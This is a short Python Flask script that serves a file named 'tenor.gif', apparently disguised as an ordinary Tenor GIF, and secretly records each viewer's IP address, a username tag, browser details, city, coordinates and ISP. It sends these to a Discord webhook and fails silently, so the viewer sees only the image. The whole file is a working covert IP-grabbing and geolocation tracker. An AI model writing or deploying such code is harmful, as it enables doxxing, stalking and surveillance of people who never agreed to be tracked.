from flask import Flask, request, send_file
import requests
import os

app = Flask(__name__)
WEBHOOK_URL = os.getenv('WEBHOOK_URL')

def get_location(ip):
    try:
        data = requests.get(f"https://ipapi.co/{ip}/json/").json()
        city = data.get("city", "Unknown")
        region = data.get("region", "Unknown")
        country = data.get("country_name", "Unknown")
        lat = data.get("latitude")
        lon = data.get("longitude")
        isp = data.get("org", "Unknown")
        location = f"{city}, {region}, {country}"
        coords = f"({lat}, {lon})" if lat and lon else "Unknown"
        return location, coords, isp
    except:
        return "Unknown", "Unknown", "Unknown"

@app.route('/tenor.gif')
def track():
    # Get real IP (behind proxy)
    forwarded = request.headers.get('X-Forwarded-For')
    ip = forwarded.split(',')[0] if forwarded else request.remote_addr

    # Get username from ?user=
    user = request.args.get('user', 'Unknown')

    # Get device
    ua = request.headers.get('User-Agent', 'Unknown')[:100]

    # Get location
    location, coords, isp = get_location(ip)

    # Send to Discord
    if WEBHOOK_URL:
        payload = {
            "content": f"**GIF Clicked**\n"
                       f"**User:** `{user}`\n"
                       f"**IP:** `{ip}`\n"
                       f"**Location:** {location}\n"
                       f"**Coordinates:** `{coords}`\n"
                       f"**ISP:** `{isp}`\n"
                       f"**Device:** `{ua}`..."
        }
        try:
            requests.post(WEBHOOK_URL, json=payload)
        except:
            pass  # Silent fail

    # Show the GIF (must be named tenor.gif in repo)
    return send_file('tenor.gif', mimetype='image/gif')

# Optional: redirect root
@app.route('/')
def home():
    return "Tracker is live. Send /tenor.gif"

if __name__ == '__main__':
    app.run()


